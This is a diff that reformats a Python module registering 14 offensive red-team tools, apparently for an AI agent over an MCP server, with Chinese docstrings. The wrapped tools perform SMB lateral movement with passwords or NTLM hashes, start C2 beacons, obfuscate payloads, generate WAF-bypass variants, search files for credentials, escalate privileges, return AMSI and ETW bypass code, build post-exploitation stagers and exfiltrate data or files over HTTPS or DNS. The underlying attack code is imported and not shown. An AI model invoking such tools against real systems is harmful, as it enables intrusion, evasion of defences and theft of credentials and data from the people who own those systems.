@@ -10,13 +10,27 @@
 """
 
 from typing import Any, Dict, List
-from .tooling import tool
-from .error_handling import (
-    handle_errors,
-    ErrorCategory,
-    extract_target,
-    extract_file_path,
-    validate_inputs,
+
+from core.exceptions import (  # 横向移动错误; C2错误; 检测器/Payload错误; 认证错误; 权限提升错误; 数据外泄错误; 通用错误
+    AuthError,
+    AutoRedTeamError,
+    BeaconError,
+    C2Error,
+    ChannelBlocked,
+    ChannelConnectionError,
+    ConfigError,
+    EscalationVectorNotFound,
+    ExfiltrationError,
+    InsufficientPrivilege,
+    InvalidCredentials,
+    LateralError,
+    PayloadError,
+    PrivilegeEscalationError,
+    SMBError,
+    SSHError,
+    TunnelError,
+    ValidationError,
+    WMIError,
 )
 
 # 授权中间件
@@ -25,34 +39,14 @@ from core.security import (
     require_dangerous_auth,
 )
 
-from core.exceptions import (
-    # 横向移动错误
-    LateralError,
-    SMBError,
-    SSHError,
-    WMIError,
-    # C2错误
-    C2Error,
-    BeaconError,
-    TunnelError,
-    # 检测器/Payload错误
-    PayloadError,
-    # 认证错误
-    AuthError,
-    InvalidCredentials,
-    # 权限提升错误
-    PrivilegeEscalationError,
-    EscalationVectorNotFound,
-    InsufficientPrivilege,
-    # 数据外泄错误
-    ExfiltrationError,
-    ChannelBlocked,
-    ChannelConnectionError,
-    # 通用错误
-    AutoRedTeamError,
-    ValidationError,
-    ConfigError,
+from .error_handling import (
+    ErrorCategory,
+    extract_file_path,
+    extract_target,
+    handle_errors,
+    validate_inputs,
 )
+from .tooling import tool
 
 
 def register_redteam_tools(mcp, counter, logger):
@@ -66,14 +60,14 @@ def register_redteam_tools(mcp, counter, logger):
 
     @tool(mcp)
     @require_critical_auth
-    @validate_inputs(target='target')
+    @validate_inputs(target="target")
     @handle_errors(logger, ErrorCategory.REDTEAM, extract_target)
     async def lateral_smb(
         target: str,
         username: str,
         password: str = None,
         ntlm_hash: str = None,
-        command: str = "whoami"
+        command: str = "whoami",
     ) -> Dict[str, Any]:
         """SMB横向移动 - 通过SMB执行远程命令
 
@@ -97,17 +91,18 @@ def register_redteam_tools(mcp, counter, logger):
             username=username,
             password=password or "",
             ntlm_hash=ntlm_hash or "",
-            command=command
+            command=command,
         )
 
     @tool(mcp)
     @require_critical_auth
-    @handle_errors(logger, ErrorCategory.REDTEAM, lambda a, kw: {'server': kw.get('server') or (a[0] if a else None)})
+    @handle_errors(
+        logger,
+        ErrorCategory.REDTEAM,
+        lambda a, kw: {"server": kw.get("server") or (a[0] if a else None)},
+    )
     async def c2_beacon_start(
-        server: str,
-        port: int = 443,
-        protocol: str = "https",
-        interval: float = 60.0
+        server: str, port: int = 443, protocol: str = "https", interval: float = 60.0
     ) -> Dict[str, Any]:
         """启动C2 Beacon - 创建到C2服务器的Beacon连接
 
@@ -124,23 +119,18 @@ def register_redteam_tools(mcp, counter, logger):
         """
         from core.c2.beacon import create_beacon
 
-        beacon = create_beacon(
-            server=server,
-            port=port,
-            protocol=protocol,
-            interval=interval
-        )
+        beacon = create_beacon(server=server, port=port, protocol=protocol, interval=interval)
 
         if beacon.connect():
             beacon.start()
             return {
-                'success': True,
-                'beacon_id': beacon.beacon_id,
-                'status': beacon.status.value,
-                'server': server
+                "success": True,
+                "beacon_id": beacon.beacon_id,
+                "status": beacon.status.value,
+                "server": server,
             }
 
-        return {'success': False, 'error': 'Connection failed', 'server': server}
+        return {"success": False, "error": "Connection failed", "server": server}
 
     @tool(mcp)
     @require_dangerous_auth
@@ -163,11 +153,11 @@ def register_redteam_tools(mcp, counter, logger):
         result = obfuscate_payload(payload, technique=technique)
 
         return {
-            'success': True,
-            'original_length': len(payload),
-            'obfuscated_length': len(result),
-            'technique': technique,
-            'obfuscated': result
+            "success": True,
+            "original_length": len(payload),
+            "obfuscated_length": len(result),
+            "technique": technique,
+            "obfuscated": result,
         }
 
     @tool(mcp)
@@ -179,7 +169,7 @@ def register_redteam_tools(mcp, counter, logger):
         max_variants: int = 30,
         include_headers: bool = False,
         include_paths: bool = False,
-        path: str = "/"
+        path: str = "/",
     ) -> Dict[str, Any]:
         """WAF绕过Payload生成 - 生成变异Payload与绕过方案
 
@@ -201,30 +191,34 @@ def register_redteam_tools(mcp, counter, logger):
         variants = engine.generate_bypass(payload, waf_type, max_variants=max_variants)
 
         data = {
-            'success': True,
-            'waf_type': waf_type.value,
-            'payload': payload,
-            'variants': [
+            "success": True,
+            "waf_type": waf_type.value,
+            "payload": payload,
+            "variants": [
                 {
-                    'payload': v.bypassed_payload,
-                    'technique': v.technique.value,
-                    'confidence': v.confidence
+                    "payload": v.bypassed_payload,
+                    "technique": v.technique.value,
+                    "confidence": v.confidence,
                 }
                 for v in variants
             ],
-            'count': len(variants)
+            "count": len(variants),
         }
 
         if include_headers:
-            data['header_bypass'] = engine.generate_header_bypass(path=path)
+            data["header_bypass"] = engine.generate_header_bypass(path=path)
         if include_paths:
-            data['path_bypass'] = engine.generate_path_bypass(path=path)
+            data["path_bypass"] = engine.generate_path_bypass(path=path)
 
         return data
 
     @tool(mcp)
     @require_critical_auth
-    @handle_errors(logger, ErrorCategory.REDTEAM, lambda a, kw: {'path': kw.get('path') or (a[0] if a else None)})
+    @handle_errors(
+        logger,
+        ErrorCategory.REDTEAM,
+        lambda a, kw: {"path": kw.get("path") or (a[0] if a else None)},
+    )
     async def credential_find(path: str = None, patterns: List[str] = None) -> Dict[str, Any]:
         """凭证发现 - 在文件中搜索敏感凭证
 
@@ -243,10 +237,10 @@ def register_redteam_tools(mcp, counter, logger):
         results = find_secrets(path=path, patterns=patterns)
 
         return {
-            'success': True,
-            'path': path,
-            'findings': results if isinstance(results, list) else [results],
-            'total': len(results) if isinstance(results, list) else 1
+            "success": True,
+            "path": path,
+            "findings": results if isinstance(results, list) else [results],
+            "total": len(results) if isinstance(results, list) else 1,
         }
 
     # ==================== 权限提升工具 ====================
@@ -269,20 +263,19 @@ def register_redteam_tools(mcp, counter, logger):
         vectors = module.enumerate_vectors()
 
         return {
-            'success': True,
-            'current_level': level.value,
-            'vectors': vectors,
-            'platform': module.platform,
-            'vectors_count': len(vectors)
+            "success": True,
+            "current_level": level.value,
+            "vectors": vectors,
+            "platform": module.platform,
+            "vectors_count": len(vectors),
         }
 
     @tool(mcp)
     @require_critical_auth
-    @handle_errors(logger, ErrorCategory.REDTEAM, lambda a, kw: {'method': kw.get('method', 'auto')})
-    async def privilege_escalate(
-        method: str = "auto",
-        timeout: float = 60.0
-    ) -> Dict[str, Any]:
+    @handle_errors(
+        logger, ErrorCategory.REDTEAM, lambda a, kw: {"method": kw.get("method", "auto")}
+    )
+    async def privilege_escalate(method: str = "auto", timeout: float = 60.0) -> Dict[str, Any]:
         """执行权限提升 - 尝试提升系统权限
 
         支持方法:
@@ -299,9 +292,9 @@ def register_redteam_tools(mcp, counter, logger):
             提权结果
         """
         from core.privilege_escalation import (
-            get_escalation_module,
+            EscalationConfig,
             EscalationMethod,
-            EscalationConfig
+            get_escalation_module,
         )
 
         config = EscalationConfig(timeout=timeout)
@@ -313,14 +306,14 @@ def register_redteam_tools(mcp, counter, logger):
             result = module.escalate(EscalationMethod(method))
 
         return {
-            'success': result.success,
-            'method': result.method.value,
-            'from_level': result.from_level.value,
-            'to_level': result.to_level.value,
-            'output': result.output,
-            'error': result.error,
-            'duration': result.duration,
-            'evidence': result.evidence
+            "success": result.success,
+            "method": result.method.value,
+            "from_level": result.from_level.value,
+            "to_level": result.to_level.value,
+            "output": result.output,
+            "error": result.error,
+            "duration": result.duration,
+            "evidence": result.evidence,
         }
 
     # ==================== 后渗透工具 ====================
@@ -340,9 +333,9 @@ def register_redteam_tools(mcp, counter, logger):
         from core.post_exploit import get_amsi_bypass
 
         return {
-            'success': True,
-            'technique': technique or 'auto',
-            'code': get_amsi_bypass(technique)
+            "success": True,
+            "technique": technique or "auto",
+            "code": get_amsi_bypass(technique),
         }
 
     @tool(mcp)
@@ -352,10 +345,7 @@ def register_redteam_tools(mcp, counter, logger):
         """ETW绕过 - 获取ETW Patch代码"""
         from core.post_exploit.advanced_techniques import ETWBypass
 
-        return {
-            'success': True,
-            'code': ETWBypass.PS_ETW_BYPASS
-        }
+        return {"success": True, "code": ETWBypass.PS_ETW_BYPASS}
 
     @tool(mcp)
     @require_critical_auth
@@ -363,7 +353,7 @@ def register_redteam_tools(mcp, counter, logger):
     async def post_exploit_stager(
         payload_type: str = "powershell",
         include_amsi_bypass: bool = True,
-        include_etw_bypass: bool = True
+        include_etw_bypass: bool = True,
     ) -> Dict[str, Any]:
         """生成后渗透stager代码"""
         from core.post_exploit import PostExploitManager
@@ -372,14 +362,10 @@ def register_redteam_tools(mcp, counter, logger):
         stager = manager.generate_stager(
             payload_type=payload_type,
             include_amsi_bypass=include_amsi_bypass,
-            include_etw_bypass=include_etw_bypass
+            include_etw_bypass=include_etw_bypass,
         )
 
-        return {
-            'success': True,
-            'payload_type': payload_type,
-            'stager': stager
-        }
+        return {"success": True, "payload_type": payload_type, "stager": stager}
 
     @tool(mcp)
     @require_critical_auth
@@ -391,46 +377,38 @@ def register_redteam_tools(mcp, counter, logger):
         manager = PostExploitManager()
         chain = manager.get_evasion_chain(target_os=target_os)
 
-        return {
-            'success': True,
-            'target_os': target_os,
-            'chain': chain
-        }
+        return {"success": True, "target_os": target_os, "chain": chain}
 
     @tool(mcp)
     @require_dangerous_auth
     @handle_errors(logger, ErrorCategory.REDTEAM)
     async def post_exploit_privesc_suggest(
-        current_privileges: List[str],
-        target_os: str = "windows"
+        current_privileges: List[str], target_os: str = "windows"
     ) -> Dict[str, Any]:
         """根据当前权限建议提权路径"""
         from core.post_exploit import PostExploitManager
 
         manager = PostExploitManager()
         suggestions = manager.suggest_privesc(
-            current_privileges=current_privileges,
-            target_os=target_os
+            current_privileges=current_privileges, target_os=target_os
         )
 
-        return {
-            'success': True,
-            'target_os': target_os,
-            'suggestions': suggestions
-        }
+        return {"success": True, "target_os": target_os, "suggestions": suggestions}
 
     # ==================== 数据外泄工具 ====================
 
     @tool(mcp)
     @require_critical_auth
-    @handle_errors(logger, ErrorCategory.REDTEAM, lambda a, kw: {'channel': kw.get('channel', 'https')})
+    @handle_errors(
+        logger, ErrorCategory.REDTEAM, lambda a, kw: {"channel": kw.get("channel", "https")}
+    )
     async def exfiltrate_data(
         data: str,
         channel: str = "https",
         destination: str = "",
         encryption: bool = True,
         dns_domain: str = "",
-        nameserver: str = ""
+        nameserver: str = "",
     ) -> Dict[str, Any]:
         """数据外泄 - 通过加密通道外泄数据
 
@@ -454,7 +432,8 @@ def register_redteam_tools(mcp, counter, logger):
             外泄结果
         """
         import base64
-        from core.exfiltration import ExfilFactory, ExfilConfig, ExfilChannel
+
+        from core.exfiltration import ExfilChannel, ExfilConfig, ExfilFactory
 
         config = ExfilConfig(
             channel=ExfilChannel(channel),
@@ -478,7 +457,7 @@ def register_redteam_tools(mcp, counter, logger):
         channel: str = "https",
         destination: str = "",
         dns_domain: str = "",
-        nameserver: str = ""
+        nameserver: str = "",
     ) -> Dict[str, Any]:
         """文件外泄 - 外泄指定文件
 
@@ -495,11 +474,12 @@ def register_redteam_tools(mcp, counter, logger):
             外泄结果
         """
         from pathlib import Path
-        from core.exfiltration import ExfilFactory, ExfilConfig, ExfilChannel
+
+        from core.exfiltration import ExfilChannel, ExfilConfig, ExfilFactory
 
         path = Path(file_path)
         if not path.exists():
-            return {'success': False, 'error': f'文件不存在: {file_path}', 'file_path': file_path}
+            return {"success": False, "error": f"文件不存在: {file_path}", "file_path": file_path}
 
         config = ExfilConfig(
             channel=ExfilChannel(channel),
@@ -513,11 +493,7 @@ def register_redteam_tools(mcp, counter, logger):
         data = path.read_bytes()
         result = module.exfiltrate(data)
 
-        return {
-            **result.to_dict(),
-            'file': str(path),
-            'file_size': len(data)
-        }
+        return {**result.to_dict(), "file": str(path), "file_size": len(data)}
 
-    counter.add('redteam', 14)
+    counter.add("redteam", 14)
     logger.info("[RedTeam] 已注册 14 个红队工具 (含WAF绕过与后渗透)")
